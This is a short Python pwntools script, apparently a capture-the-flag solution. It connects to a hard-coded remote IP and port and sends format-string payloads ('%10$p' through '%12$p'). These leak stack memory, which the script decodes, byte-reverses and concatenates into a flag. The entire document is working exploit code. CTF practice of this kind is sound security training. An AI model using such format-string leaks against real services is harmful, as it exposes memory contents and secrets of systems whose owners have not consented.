from pwn import *


elf=context.binary =ELF('./main')

context.log_level='error'

flag =''
for i in range(10,13):
	#p =process()
	p =remote('20.199.80.91' ,7400)
	x ='%'+str(i)+'$p'
	p.sendline(x.encode())
	
	try:
		p.recvuntil(b'? > ')
		adr =str(p.recvline())
		print(adr)
		hex_string=adr.split('0x')[1].strip()[:-3]
		print(hex_string)
		binary_data = bytes.fromhex(hex_string)
		print(binary_data.decode('utf-8')[::-1])
		flag =flag+ binary_data.decode('utf-8')[::-1]

	except:
		print(str(p.recv()))
	
	

	p.close()
	


print("Flag :",flag)


